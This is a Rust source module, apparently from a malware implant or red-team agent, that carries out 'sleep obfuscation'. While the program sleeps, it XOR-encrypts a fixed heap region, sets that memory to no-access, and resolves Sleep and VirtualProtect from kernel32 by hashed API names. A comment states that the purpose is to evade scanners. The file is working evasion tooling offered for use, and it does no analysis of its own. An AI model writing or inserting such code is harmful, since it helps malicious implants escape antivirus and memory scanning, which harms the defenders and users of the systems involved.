#[cfg(not(target_os = "windows"))]
use super::syscalls::{sys_nanosleep, Timespec};

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};

pub fn sleep(ms: u64) {
    // Obfuscation: Encrypt heap memory to evade scanners during sleep
    encrypt_heap();

    #[cfg(target_os = "windows")]
    unsafe {
        // Change heap to NOACCESS
        set_memory_protection(0x10000000 as *mut u8, 1024 * 1024, 0x01); // PAGE_NOACCESS
    }

    #[cfg(not(target_os = "windows"))]
    {
        let req = Timespec {
            tv_sec: (ms / 1000) as i64,
            tv_nsec: ((ms % 1000) * 1_000_000) as i64,
        };
        unsafe {
            sys_nanosleep(&req, core::ptr::null_mut());
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            // Resolve kernel32.Sleep
            let k32_hash = hash_str(b"KERNEL32.DLL");
            let sleep_hash = hash_str(b"Sleep");
            let fn_sleep = resolve_function(k32_hash, sleep_hash);

            if !fn_sleep.is_null() {
                type SleepFn = unsafe extern "system" fn(u32);
                let sleep: SleepFn = core::mem::transmute(fn_sleep);
                sleep(ms as u32);
            }

            // Restore heap protection
            set_memory_protection(0x10000000 as *mut u8, 1024 * 1024, 0x04); // PAGE_READWRITE
        }
    }

    decrypt_heap();
}

#[cfg(target_os = "windows")]
unsafe fn set_memory_protection(base: *mut u8, size: usize, protect: u32) {
    let k32_hash = hash_str(b"KERNEL32.DLL");
    let vp_hash = hash_str(b"VirtualProtect");
    let fn_vp = resolve_function(k32_hash, vp_hash);
    if !fn_vp.is_null() {
        type VirtualProtectFn = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
        let virtual_protect: VirtualProtectFn = core::mem::transmute(fn_vp);
        let mut old = 0;
        virtual_protect(base, size, protect, &mut old);
    }
}

pub fn encrypt_heap() {
    // Simple XOR encryption of the heap region
    // Heap base defined in lib.rs global allocator
    let heap_start = 0x10000000 as *mut u8;
    let heap_size = 1024 * 1024;
    let key = 0xAA;

    unsafe {
        for i in 0..heap_size {
            let ptr = heap_start.add(i);
            *ptr ^= key;
        }
    }
}

pub fn decrypt_heap() {
    encrypt_heap(); // XOR is symmetric
}
